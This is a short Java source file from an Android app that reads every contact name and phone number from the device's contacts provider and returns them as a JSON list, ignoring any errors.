package com.fason.app.features.contacts;

import android.database.Cursor;
import android.provider.ContactsContract.CommonDataKinds.Phone;

import com.fason.app.core.FasonApp;

import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsManager {

    public static JSONObject getContacts() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            Cursor cur = FasonApp.getContext().getContentResolver().query(
                Phone.CONTENT_URI,
                new String[]{Phone.DISPLAY_NAME, Phone.NUMBER},
                null, null, Phone.DISPLAY_NAME + " ASC");

            if (cur != null) {
                int nameIdx = cur.getColumnIndex(Phone.DISPLAY_NAME);
                int numIdx = cur.getColumnIndex(Phone.NUMBER);

                while (cur.moveToNext()) {
                    JSONObject c = new JSONObject();
                    if (nameIdx >= 0) c.put("name", cur.getString(nameIdx));
                    if (numIdx >= 0) c.put("phoneNo", cur.getString(numIdx));
                    list.put(c);
                }
                cur.close();
            }
            result.put("contactsList", list);
        } catch (Exception ignored) {}

        return result;
    }
}
